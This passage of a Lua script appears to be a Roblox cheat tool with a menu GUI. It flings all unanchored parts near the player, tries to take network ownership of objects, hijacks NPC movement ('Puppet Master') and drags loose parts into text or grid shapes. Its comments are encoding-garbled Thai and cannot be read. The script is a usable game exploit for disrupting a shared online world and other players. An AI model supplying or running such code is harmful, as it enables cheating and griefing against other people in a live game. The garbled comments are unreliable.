    -- ‡∏£‡∏∞‡∏ö‡∏ö‡∏Å‡∏î‡∏Ñ‡πâ‡∏≤‡∏á‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏û‡∏¥‡πà‡∏°/‡∏•‡∏î‡∏£‡∏∞‡∏¢‡∏∞
    setupHoldButton(btnPlusR, 5, function(d)
        deleteRadius = math.min(200, deleteRadius + d)
        rangeLabel.Text = "DEL RADIUS: " .. deleteRadius
    end)
    setupHoldButton(btnMinusR, -5, function(d)
        deleteRadius = math.max(5, deleteRadius + d)
        rangeLabel.Text = "DEL RADIUS: " .. deleteRadius
    end)
end

-- [[ CORE LOGIC (RunService) ]] --
RunService.Stepped:Connect(function()
    if not autoDelete then return end
    
    local char = LP.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local myRoot = char.HumanoidRootPart

    -- ‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ Part ‡∏£‡∏≠‡∏ö‡∏ï‡∏±‡∏ß‡πÉ‡∏ô‡∏£‡∏∞‡∏¢‡∏∞‡∏ó‡∏µ‡πà‡∏Å‡∏≥‡∏´‡∏ô‡∏î
    local parts = workspace:GetPartBoundsInRadius(myRoot.Position, deleteRadius)
    
    for _, p in ipairs(parts) do
        -- ‡πÄ‡∏á‡∏∑‡πà‡∏≠‡∏ô‡πÑ‡∏Ç: ‡πÄ‡∏õ‡πá‡∏ô BasePart, ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ Anchor, ‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà‡∏ï‡∏±‡∏ß‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô‡πÄ‡∏≠‡∏á
        if p:IsA("BasePart") and not p.Anchored and not isPlayer(p) then
            -- ‡∏õ‡∏•‡πà‡∏≠‡∏¢‡∏à‡∏≤‡∏Å‡∏Å‡∏≤‡∏£‡∏à‡∏±‡∏ö‡∏ñ‡πâ‡∏≤‡∏°‡∏µ‡∏Å‡∏≤‡∏£‡∏à‡∏±‡∏ö‡∏≠‡∏¢‡∏π‡πà
            if grabbed[p] then
                grabbed[p].bp:Destroy()
                grabbed[p].bg:Destroy()
                grabbed[p] = nil
            end

            -- ‡∏î‡∏µ‡∏î‡∏≠‡∏≠‡∏Å‡πÑ‡∏õ‡∏î‡πâ‡∏ß‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏™‡∏π‡∏á (‡∏û‡∏∏‡πà‡∏á‡∏Ç‡∏∂‡πâ‡∏ô‡∏ü‡πâ‡∏≤‡πÅ‡∏•‡∏∞‡∏≠‡∏≠‡∏Å‡πÑ‡∏õ‡∏î‡πâ‡∏≤‡∏ô‡∏Ç‡πâ‡∏≤‡∏á)
            p.AssemblyLinearVelocity = Vector3.new(
                math.random(-10, 10), 
                deleteSpeed, 
                math.random(-10, 10)
            )
            
            -- ‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô Network Ownership ‡∏Ç‡∏±‡∏î‡∏Ç‡∏ß‡∏≤‡∏á‡∏Å‡∏≤‡∏£‡∏î‡∏µ‡∏î
            pcall(function()
                if p:GetNetworkOwner() ~= LP then
                    p:SetNetworkOwner(LP)
                end
            end)
        end
    end
end)
-- [[ PUPPET MASTER SETTINGS ]] --
local puppetList = {}
local selectedForControl = {} 
local controlling = false
local currentPuppet = nil
local selectClickMode = false
local autoAddNPC = false

-- ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏´‡∏ô‡πâ‡∏≤‡πÉ‡∏´‡∏°‡πà‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö Puppet Master
pages.puppet = createPage()

-- ‡∏õ‡∏∏‡πà‡∏°‡∏Å‡∏î‡∏à‡∏≤‡∏Å‡∏´‡∏ô‡πâ‡∏≤‡∏´‡∏•‡∏±‡∏Å‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà‡πÇ‡∏´‡∏°‡∏î Puppet Master
btn(pages.main, "OPEN PUPPET MASTER", function()
    showPage("puppet")
end)

-- [[ ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ä‡πà‡∏ß‡∏¢‡πÄ‡∏´‡∏•‡∏∑‡∏≠ ]] --
local function getPuppetModel(obj)
    if not obj then return nil end
    local model = obj:FindFirstAncestorOfClass("Model")
    if model and model:FindFirstChildOfClass("Humanoid") then
        if game.Players:GetPlayerFromCharacter(model) or model == LP.Character then
            return nil
        end
        return model
    end
    return nil
end

-- [[ ‡∏£‡∏∞‡∏ö‡∏ö UI ‡πÉ‡∏ô‡∏´‡∏ô‡πâ‡∏≤ PUPPET MASTER ]] --
label(pages.puppet, "PUPPET MASTER CONTROL")

-- Dropdown (ScrollingFrame)
local dropDown = Instance.new("ScrollingFrame", pages.puppet)
dropDown.Size = UDim2.new(1, 0, 0, 120)
dropDown.CanvasSize = UDim2.new(0, 0, 0, 0)
dropDown.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
dropDown.BorderSizePixel = 0
local dropLayout = Instance.new("UIListLayout", dropDown)

local function refreshPuppetList()
    for _, v in ipairs(dropDown:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
    for i, model in ipairs(puppetList) do
        if model and model.Parent and model:FindFirstChildOfClass("Humanoid") and model:FindFirstChildOfClass("Humanoid").Health > 0 then
            local isActive = selectedForControl[model]
            local prefix = (currentPuppet == model) and "[FOCUS] " or ""
            local b = btn(dropDown, prefix .. model.Name .. (isActive and " (ON)" or " (OFF)"), function()
                currentPuppet = model
                selectedForControl[model] = not selectedForControl[model]
                if controlling and currentPuppet:FindFirstChildOfClass("Humanoid") then
                    Cam.CameraSubject = currentPuppet:FindFirstChildOfClass("Humanoid")
                end
                refreshPuppetList()
            end)
            b.BackgroundColor3 = isActive and Color3.fromRGB(50, 70, 100) or Color3.fromRGB(45, 45, 45)
        else
            selectedForControl[model] = nil
            table.remove(puppetList, i)
        end
    end
    dropDown.CanvasSize = UDim2.new(0, 0, 0, dropLayout.AbsoluteContentSize.Y)
end

-- ‡∏õ‡∏∏‡πà‡∏° CLICK TO ADD
local btnSelectMode = btn(pages.puppet, "CLICK TO ADD NPC: OFF", function(b)
    selectClickMode = not selectClickMode
    b.Text = "CLICK TO ADD NPC: " .. (selectClickMode and "ON" or "OFF")
    b.BackgroundColor3 = selectClickMode and Color3.fromRGB(0, 100, 180) or Color3.fromRGB(70, 70, 70)
end)

-- ‡∏õ‡∏∏‡πà‡∏° AUTO ADD
local btnAutoMode = btn(pages.puppet, "AUTO ADD NEARBY: OFF", function(b)
    autoAddNPC = not autoAddNPC
    b.Text = "AUTO ADD NEARBY: " .. (autoAddNPC and "ON" or "OFF")
    b.BackgroundColor3 = autoAddNPC and Color3.fromRGB(0, 100, 180) or Color3.fromRGB(70, 70, 70)
end)

-- ‡πÅ‡∏ñ‡∏ß‡∏õ‡∏∏‡πà‡∏° SELECT ALL / UNSELECT ALL
local row = Instance.new("Frame", pages.puppet)
row.Size = UDim2.new(1, 0, 0, 30); row.BackgroundTransparency = 1
Instance.new("UIListLayout", row).FillDirection = Enum.FillDirection.Horizontal

btn(row, "SELECT ALL", function()
    for _, m in ipairs(puppetList) do selectedForControl[m] = true end
    refreshPuppetList()
end).Size = UDim2.new(0.5, -2, 1, 0)

btn(row, "UNSELECT ALL", function()
    for _, m in ipairs(puppetList) do selectedForControl[m] = false end
    refreshPuppetList()
end).Size = UDim2.new(0.5, -2, 1, 0)

-- ‡∏õ‡∏∏‡πà‡∏° START / STOP CONTROL
local btnControl = btn(pages.puppet, "START CONTROL", function(b)
    controlling = not controlling
    if controlling then
        if not currentPuppet then 
            for m, s in pairs(selectedForControl) do if s then currentPuppet = m break end end
        end
        if not currentPuppet then controlling = false return end
        b.Text = "STOP CONTROL"
        b.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
        Cam.CameraSubject = currentPuppet:FindFirstChildOfClass("Humanoid")
        if LP.Character then LP.Character.HumanoidRootPart.Anchored = true end 
    else
        b.Text = "START CONTROL"
        b.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
        Cam.CameraSubject = LP.Character:FindFirstChildOfClass("Humanoid")
        if LP.Character then LP.Character.HumanoidRootPart.Anchored = false end 
    end
end)
btnControl.Size = UDim2.new(1, 0, 0, 40)

-- ‡∏õ‡∏∏‡πà‡∏° BACK ‡πÑ‡∏õ‡∏´‡∏ô‡πâ‡∏≤‡∏´‡∏•‡∏±‡∏Å
btn(pages.puppet, "BACK TO MAIN", function()
    showPage("main")
end)

-- [[ LOGIC ]] --

-- ‡∏£‡∏∞‡∏ö‡∏ö‡∏Ñ‡∏•‡∏¥‡∏Å
UserInputService.InputBegan:Connect(function(input, gp)
    if gp or not selectClickMode then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        local ray = Cam:ScreenPointToRay(input.Position.X, input.Position.Y)
        local res = workspace:Raycast(ray.Origin, ray.Direction * 1000)
        if res and res.Instance then
            local m = getPuppetModel(res.Instance)
            if m then
                local root = m:FindFirstChild("HumanoidRootPart")
                if root and (root.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= holdDistance then
                    if not table.find(puppetList, m) then
                        table.insert(puppetList, m)
                        selectedForControl[m] = true
                        refreshPuppetList()
                    end
                end
            end
        end
    end
end)

-- Loop ‡∏Å‡∏≤‡∏£‡∏ó‡∏≥‡∏á‡∏≤‡∏ô
RunService.Heartbeat:Connect(function()
    local changed = false
    -- Auto Remove Dead
    for i = #puppetList, 1, -1 do
        local m = puppetList[i]
        if not m or not m.Parent or (m:FindFirstChildOfClass("Humanoid") and m:FindFirstChildOfClass("Humanoid").Health <= 0) then
            table.remove(puppetList, i)
            selectedForControl[m] = nil
            if currentPuppet == m then currentPuppet = nil end
            changed = true
        end
    end
    
    -- Auto Add NPC
    if autoAddNPC and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
        local myPos = LP.Character.HumanoidRootPart.Position
        local parts = workspace:GetPartBoundsInRadius(myPos, holdDistance)
        for _, p in ipairs(parts) do
            local m = getPuppetModel(p)
            if m and not table.find(puppetList, m) then
                table.insert(puppetList, m)
                selectedForControl[m] = true
                changed = true
            end
        end
    end
    if changed then refreshPuppetList() end

    -- Control Physics
    if controlling and LP.Character then
        local moveDir = LP.Character:FindFirstChildOfClass("Humanoid").MoveDirection
        for npc, isSelected in pairs(selectedForControl) do
            if isSelected and npc:FindFirstChild("HumanoidRootPart") then
                local root = npc.HumanoidRootPart
                pcall(function() root:SetNetworkOwner(LP) end)
                if moveDir.Magnitude > 0 then
                    root.AssemblyLinearVelocity = Vector3.new(moveDir.X * 30, root.AssemblyLinearVelocity.Y, moveDir.Z * 30)
                    root.CFrame = root.CFrame:Lerp(CFrame.lookAt(root.Position, root.Position + moveDir), 0.2)
                else
                    root.AssemblyLinearVelocity = Vector3.new(0, root.AssemblyLinearVelocity.Y, 0)
                end
            end
        end
    end
end)
-- [[ TEXT PART SYSTEM - PRO VERSION ]] --
local textMode = false
local textFrozen = false
local textString = "HELLO"
local textPartsMap = {} 
local frozenAnchorPoints = {} -- ‡πÄ‡∏Å‡πá‡∏ö‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡∏û‡∏¥‡∏Å‡∏±‡∏î‡πÇ‡∏•‡∏Å‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏Å‡∏î Freeze

-- ‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏≠‡∏±‡∏Å‡∏©‡∏£ 3x5 (‡∏õ‡∏£‡∏±‡∏ö‡πÉ‡∏´‡πâ‡∏Ñ‡∏°‡∏ä‡∏±‡∏î‡∏Ç‡∏∂‡πâ‡∏ô)
local charMap = {
    ["A"] = {0,1,0, 1,0,1, 1,1,1, 1,0,1, 1,0,1}, ["B"] = {1,1,0, 1,0,1, 1,1,0, 1,0,1, 1,1,0},
    ["C"] = {0,1,1, 1,0,0, 1,0,0, 1,0,0, 0,1,1}, ["D"] = {1,1,0, 1,0,1, 1,0,1, 1,0,1, 1,1,0},
    ["E"] = {1,1,1, 1,0,0, 1,1,0, 1,0,0, 1,1,1}, ["F"] = {1,1,1, 1,0,0, 1,1,0, 1,0,0, 1,0,0},
    ["G"] = {0,1,1, 1,0,0, 1,0,1, 1,0,1, 0,1,1}, ["H"] = {1,0,1, 1,0,1, 1,1,1, 1,0,1, 1,0,1},
    ["I"] = {1,1,1, 0,1,0, 0,1,0, 0,1,0, 1,1,1}, ["J"] = {0,0,1, 0,0,1, 0,0,1, 1,0,1, 0,1,0},
    ["K"] = {1,0,1, 1,0,1, 1,1,0, 1,0,1, 1,0,1}, ["L"] = {1,0,0, 1,0,0, 1,0,0, 1,0,0, 1,1,1},
    ["M"] = {1,0,1, 1,1,1, 1,1,1, 1,0,1, 1,0,1}, ["N"] = {1,1,1, 1,0,1, 1,0,1, 1,0,1, 1,0,1},
    ["O"] = {0,1,0, 1,0,1, 1,0,1, 1,0,1, 0,1,0}, ["P"] = {1,1,0, 1,0,1, 1,1,0, 1,0,0, 1,0,0},
    ["Q"] = {0,1,0, 1,0,1, 1,0,1, 1,1,1, 0,0,1}, ["R"] = {1,1,0, 1,0,1, 1,1,0, 1,0,1, 1,0,1},
    ["S"] = {0,1,1, 1,0,0, 0,1,0, 0,0,1, 1,1,0}, ["T"] = {1,1,1, 0,1,0, 0,1,0, 0,1,0, 0,1,0},
    ["U"] = {1,0,1, 1,0,1, 1,0,1, 1,0,1, 1,1,1}, ["V"] = {1,0,1, 1,0,1, 1,0,1, 0,1,0, 0,1,0},
    ["W"] = {1,0,1, 1,0,1, 1,1,1, 1,1,1, 1,0,1}, ["X"] = {1,0,1, 1,0,1, 0,1,0, 1,0,1, 1,0,1},
    ["Y"] = {1,0,1, 1,0,1, 0,1,0, 0,1,0, 0,1,0}, ["Z"] = {1,1,1, 0,0,1, 0,1,0, 1,0,0, 1,1,1},
    [" "] = {0,0,0, 0,0,0, 0,0,0, 0,0,0, 0,0,0}, ["0"] = {1,1,1, 1,0,1, 1,0,1, 1,0,1, 1,1,1},
    ["1"] = {0,1,0, 1,1,0, 0,1,0, 0,1,0, 1,1,1},
}

-- ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Part ‡∏ó‡∏µ‡πà‡∏î‡∏∂‡∏á‡πÑ‡∏î‡πâ
local function isValidTextPart(p)
    if not p:IsA("BasePart") or p.Anchored then return false end
    if p:FindFirstAncestorOfClass("Model") then
        local m = p:FindFirstAncestorOfClass("Model")
        if game.Players:GetPlayerFromCharacter(m) or m:FindFirstChildOfClass("Humanoid") then return false end
    end
    return true
end

-- [[ UI SYSTEM ]] --
if pages and pages.main then
    label(pages.main, "TEXT PART CONTROL")
    
    local editFrame = Instance.new("Frame", pages.main)
    editFrame.Size = UDim2.new(1, 0, 0, 35); editFrame.BackgroundTransparency = 1
    Instance.new("UIListLayout", editFrame).FillDirection = "Horizontal"

    local textBox = Instance.new("TextBox", editFrame)
    textBox.Size = UDim2.new(0.6, -5, 1, 0); textBox.Text = "HELLO"
    textBox.BackgroundColor3 = Color3.fromRGB(40,40,40); textBox.TextColor3 = Color3.new(1,1,1)

    -- ‡∏õ‡∏∏‡πà‡∏°‡πÄ‡∏õ‡∏¥‡∏î/‡∏õ‡∏¥‡∏î ‡∏£‡∏∞‡∏ö‡∏ö‡∏£‡∏ß‡∏° Part
    local btnToggle = btn(editFrame, "MODE: OFF", function(b)
        textMode = not textMode
        b.Text = "MODE: " .. (textMode and "ON" or "OFF")
        b.BackgroundColor3 = textMode and Color3.fromRGB(0,120,200) or Color3.fromRGB(60,60,60)
        
        if not textMode then
            textFrozen = false
            for p, _ in pairs(textPartsMap) do
                p.Anchored = false
                if p:FindFirstChild("BodyPosition") then p.BodyPosition:Destroy() end
                if p:FindFirstChild("BodyGyro") then p.BodyGyro:Destroy() end
            end
            textPartsMap = {}
        end
    end)
    btnToggle.Size = UDim2.new(0.4, 0, 1, 0)

    -- ‡∏õ‡∏∏‡πà‡∏° Freeze (‡∏ß‡∏≤‡∏á‡πÉ‡∏Å‡∏•‡πâ‡πÜ ‡∏ä‡πà‡∏≠‡∏á‡πÉ‡∏™‡πà‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°)
    local btnFreeze = btn(pages.main, "FREEZE TEXT: OFF", function(b)
        if not textMode then return end
        textFrozen = not textFrozen
        b.Text = "FREEZE TEXT: " .. (textFrozen and "ON" or "OFF")
        b.BackgroundColor3 = textFrozen and Color3.fromRGB(200,100,0) or Color3.fromRGB(60,60,60)
        
        -- ‡∏ñ‡πâ‡∏≤‡∏Å‡∏î Freeze ‡πÉ‡∏´‡πâ‡∏™‡∏±‡πà‡∏á Anchored ‡∏ó‡∏∏‡∏Å‡∏ï‡∏±‡∏ß‡∏ó‡∏µ‡πà‡∏ñ‡∏∑‡∏≠‡∏≠‡∏¢‡∏π‡πà
        for p, _ in pairs(textPartsMap) do
            p.Anchored = textFrozen
            if textFrozen then
                if p:FindFirstChild("BodyPosition") then p.BodyPosition:Destroy() end
                if p:FindFirstChild("BodyGyro") then p.BodyGyro:Destroy() end
            end
        end
    end)

    textBox:GetPropertyChangedSignal("Text"):Connect(function()
        textString = textBox.Text:upper()
        if textFrozen then -- ‡∏ñ‡πâ‡∏≤‡πÅ‡∏Å‡πâ‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÉ‡∏´‡πâ‡∏´‡∏•‡∏∏‡∏î Freeze ‡∏≠‡∏±‡∏ï‡πÇ‡∏ô‡∏°‡∏±‡∏ï‡∏¥‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏à‡∏±‡∏î‡πÉ‡∏´‡∏°‡πà
            textFrozen = false
            btnFreeze.Text = "FREEZE TEXT: OFF"
            btnFreeze.BackgroundColor3 = Color3.fromRGB(60,60,60)
        end
    end)
end

-- [[ CORE LOGIC ]] --
RunService.Heartbeat:Connect(function()
    if not textMode or textFrozen then return end
    if not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") then return end
    
    local root = LP.Character.HumanoidRootPart
    local startCFrame = root.CFrame * CFrame.new(0, 5, -10) -- ‡∏£‡∏∞‡∏¢‡∏∞‡∏´‡πà‡∏≤‡∏á‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô

    -- ‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ Part ‡∏ß‡πà‡∏≤‡∏á
    local available = {}
    for _, p in ipairs(workspace:GetPartBoundsInRadius(root.Position, 100)) do
        if isValidTextPart(p) and not textPartsMap[p] then table.insert(available, p) end
    end

    -- ‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡∏à‡∏∏‡∏î Grid
    local dots = {}
    local cursorX = 0
    for i = 1, #textString do
        local char = string.sub(textString, i, i)
        local matrix = charMap[char] or charMap[" "]
        for row = 0, 4 do
            for col = 0, 2 do
                if matrix[(row * 3) + col + 1] == 1 then
                    table.insert(dots, {x = cursorX + col, y = 4 - row})
                end
            end
        end
        cursorX = cursorX + 4 -- ‡∏£‡∏∞‡∏¢‡∏∞‡∏´‡πà‡∏≤‡∏á‡∏£‡∏∞‡∏´‡∏ß‡πà‡∏≤‡∏á‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£
    end

    local usedThisFrame = {}
    for i, dot in ipairs(dots) do
        local part = nil
        -- ‡∏´‡∏≤ Part ‡∏ó‡∏µ‡πà‡∏Ñ‡∏£‡∏≠‡∏á‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡∏ô‡∏µ‡πâ‡∏≠‡∏¢‡∏π‡πà
        for p, idx in pairs(textPartsMap) do if idx == i then part = p break end end
        
        -- ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡∏°‡∏µ‡πÉ‡∏´‡πâ‡∏î‡∏∂‡∏á‡∏ï‡∏±‡∏ß‡πÉ‡∏´‡∏°‡πà
        if not part and #available > 0 then
            part = table.remove(available, 1)
            textPartsMap[part] = i
        end

        if part and part.Parent then
            usedThisFrame[part] = true
            -- ‡∏à‡∏±‡∏î‡∏£‡∏∞‡πÄ‡∏ö‡∏µ‡∏¢‡∏ö: ‡πÉ‡∏ä‡πâ‡∏Ç‡∏ô‡∏≤‡∏î‡πÄ‡∏â‡∏•‡∏µ‡πà‡∏¢‡∏Ç‡∏≠‡∏á Part ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡∏£‡∏∞‡∏¢‡∏∞‡∏´‡πà‡∏≤‡∏á (Gap)
            local gap = (part.Size.X + part.Size.Z) / 2 * 1.1 
            local targetPos = startCFrame * CFrame.new((dot.x * gap) - (cursorX * gap / 2), dot.y * gap, 0)
            
            pcall(function() part:SetNetworkOwner(LP) end)
            part.CanCollide = false
            part.Anchored = false

            local bp = part:FindFirstChild("BodyPosition") or Instance.new("BodyPosition", part)
            bp.MaxForce = Vector3.new(1,1,1) * 100000; bp.P = 15000; bp.Position = targetPos.Position
            
            local bg = part:FindFirstChild("BodyGyro") or Instance.new("BodyGyro", part)
            bg.MaxTorque = Vector3.new(1,1,1) * 100000; bg.CFrame = targetPos
        end
    end

    -- ‡∏Ñ‡∏∑‡∏ô‡∏Ñ‡πà‡∏≤ Part ‡∏ó‡∏µ‡πà‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡πÉ‡∏ä‡πâ
    for p, _ in pairs(textPartsMap) do
        if not usedThisFrame[p] then
            p.Anchored = false
            p.CanCollide = true
            if p:FindFirstChild("BodyPosition") then p.BodyPosition:Destroy() end
            if p:FindFirstChild("BodyGyro") then p.BodyGyro:Destroy() end
            textPartsMap[p] = nil
        end
    end
end)
-- [[ 3D GRID BUILDER - V2 FIXED ]] --
local buildMode = false
local buildFrozen = false
local buildData = {} 
local buildPartsMap = {}
local gridRes = 10 -- ‡∏õ‡∏£‡∏±‡∏ö‡πÄ‡∏õ‡πá‡∏ô 10 ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ‡∏ä‡πà‡∏≠‡∏á‡πÉ‡∏´‡∏ç‡πà‡∏Ç‡∏∂‡πâ‡∏ô ‡∏Å‡∏î‡∏á‡πà‡∏≤‡∏¢‡∏Ç‡∏∂‡πâ‡∏ô‡∏°‡∏≤‡∏Å

-- ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏´‡∏ô‡πâ‡∏≤ Build Mode
pages.build = createPage()
btn(pages.main, "BUILDER MODE (3D)", function() showPage("build") end)

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏Å‡∏£‡∏≠‡∏á Part (‡πÑ‡∏°‡πà‡∏î‡∏∂‡∏á‡∏Ñ‡∏ô/NPC/‡∏ï‡∏±‡∏ß‡πÄ‡∏£‡∏≤)
local function isUsable(p)
    if not p:IsA("BasePart") or p.Anchored then return false end
    if p:FindFirstAncestorOfClass("Model") then
        local m = p:FindFirstAncestorOfClass("Model")
        if game.Players:GetPlayerFromCharacter(m) or m:FindFirstChildOfClass("Humanoid") then return false end
    end
    if p:IsDescendantOf(LP.Character) then return false end
    return true
end

-- [[ UI SETUP ]] --
label(pages.build, "--- 3D GRID BUILDER ---")

-- ‡∏Ç‡∏¢‡∏≤‡∏¢‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏ß‡∏≤‡∏î‡πÉ‡∏´‡πâ‡πÉ‡∏´‡∏ç‡πà‡πÅ‡∏•‡∏∞‡∏ä‡∏±‡∏î‡πÄ‡∏à‡∏ô
local canvasFrame = Instance.new("Frame", pages.build)
canvasFrame.Size = UDim2.new(1, 0, 0, 280) -- ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏π‡∏á‡πÉ‡∏´‡πâ‡∏Å‡∏î‡∏á‡πà‡∏≤‡∏¢
canvasFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
canvasFrame.BorderSizePixel = 0

local gridLayout = Instance.new("UIGridLayout", canvasFrame)
gridLayout.CellSize = UDim2.new(1/gridRes, -2, 1/gridRes, -2)
gridLayout.CellPadding = UDim2.new(0, 2, 0, 2)

local gridCells = {}
for y = 1, gridRes do
    for x = 1, gridRes do
        local cell = Instance.new("TextButton", canvasFrame)
        cell.Text = ""
        cell.BackgroundColor3 = Color3.fromRGB(45, 45, 45) -- ‡∏™‡∏µ‡∏û‡∏∑‡πâ‡∏ô‡∏ï‡∏≤‡∏£‡∏≤‡∏á
        cell.BorderSizePixel = 0
        
        local key = x .. "_" .. y
        cell.MouseButton1Click:Connect(function()
            if buildData[key] then
                -- ‡∏ñ‡πâ‡∏≤‡∏°‡∏µ‡∏ö‡∏•‡πá‡∏≠‡∏Å‡∏≠‡∏¢‡∏π‡πà‡πÅ‡∏•‡πâ‡∏ß -> ‡πÄ‡∏≠‡∏≤‡∏≠‡∏≠‡∏Å (Toggle Off)
                buildData[key] = nil
                cell.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
            else
                -- ‡∏ñ‡πâ‡∏≤‡∏¢‡∏±‡∏á‡πÑ‡∏°‡πà‡∏°‡∏µ -> ‡∏ß‡∏≤‡∏á‡∏ö‡∏•‡πá‡∏≠‡∏Å (Toggle On)
                buildData[key] = true
                cell.BackgroundColor3 = Color3.fromRGB(0, 170, 255) -- ‡∏™‡∏µ‡∏ü‡πâ‡∏≤‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏ß‡∏≤‡∏á
            end
        end)
        gridCells[key] = cell
    end
end

-- ‡∏õ‡∏∏‡πà‡∏°‡∏Ñ‡∏ß‡∏ö‡∏Ñ‡∏∏‡∏° (‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏•‡πâ‡∏ß‡∏ô)
local btnToggle = btn(pages.build, "BUILD MODE: OFF", function(b)
    buildMode = not buildMode
    b.Text = "BUILD MODE: " .. (buildMode and "ON" or "OFF")
    b.BackgroundColor3 = buildMode and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(60, 60, 60)
    
    if not buildMode then
        buildFrozen = false
        for p, _ in pairs(buildPartsMap) do
            p.Anchored = false
            if p:FindFirstChild("BodyPosition") then p.BodyPosition:Destroy() end
            if p:FindFirstChild("BodyGyro") then p.BodyGyro:Destroy() end
        end
        buildPartsMap = {}
    end
end)

local btnFreeze = btn(pages.build, "FREEZE PICTURE: OFF", function(b)
    if not buildMode then return end
    buildFrozen = not buildFrozen
    b.Text = "FREEZE PICTURE: " .. (buildFrozen and "ON" or "OFF")
    b.BackgroundColor3 = buildFrozen and Color3.fromRGB(200, 0, 0) or Color3.fromRGB(60, 60, 60)
    
    for p, _ in pairs(buildPartsMap) do
        p.Anchored = buildFrozen
        if buildFrozen then
            if p:FindFirstChild("BodyPosition") then p.BodyPosition:Destroy() end
            if p:FindFirstChild("BodyGyro") then p.BodyGyro:Destroy() end
        end
    end
end)

btn(pages.build, "CLEAR ALL BLOCKS", function()
    buildData = {}
    for _, cell in pairs(gridCells) do
        cell.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    end
end)

btn(pages.build, "BACK TO MAIN", function()
    showPage("main")
end)

-- [[ BUILDER LOGIC ]] --
RunService.Heartbeat:Connect(function()
    if not buildMode or buildFrozen then return end
    if not LP.Character or not LP.Character.PrimaryPart then return end

    local root = LP.Character.PrimaryPart
    -- ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏à‡∏∏‡∏î‡∏≠‡πâ‡∏≤‡∏á‡∏≠‡∏¥‡∏á‡πÉ‡∏´‡πâ‡∏Ç‡∏¢‡∏±‡∏ö‡∏ï‡∏≤‡∏°‡∏ï‡∏±‡∏ß‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô ‡πÅ‡∏ï‡πà‡πÑ‡∏°‡πà‡∏´‡∏°‡∏∏‡∏ô‡∏ï‡∏≤‡∏°‡∏´‡∏ô‡πâ‡∏≤‡∏à‡∏≠‡∏ï‡∏•‡∏≠‡∏î‡πÄ‡∏ß‡∏•‡∏≤‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏á‡πà‡∏≤‡∏¢
    local basePos = root.Position
    local baseCFrame = CFrame.new(basePos) * (root.CFrame - basePos) 

    -- ‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ Part ‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ‡πÑ‡∏î‡πâ
    local available = {}
    for _, p in ipairs(workspace:GetPartBoundsInRadius(root.Position, 100)) do
        if isUsable(p) and not buildPartsMap[p] then
            table.insert(available, p)
        end
    end

    local activePoints = {}
    for key, _ in pairs(buildData) do
        local coords = string.split(key, "_")
        table.insert(activePoints, {x = tonumber(coords[1]), y = tonumber(coords[2]), key = key})
    end

    local usedThisFrame = {}
    for _, pt in ipairs(activePoints) do
        local part = nil
        -- ‡∏´‡∏≤ Part ‡∏ó‡∏µ‡πà‡∏Ñ‡∏£‡∏≠‡∏á‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡∏ô‡∏µ‡πâ‡∏≠‡∏¢‡∏π‡πà
        for p, k in pairs(buildPartsMap) do if k == pt.key then part = p break end end
        
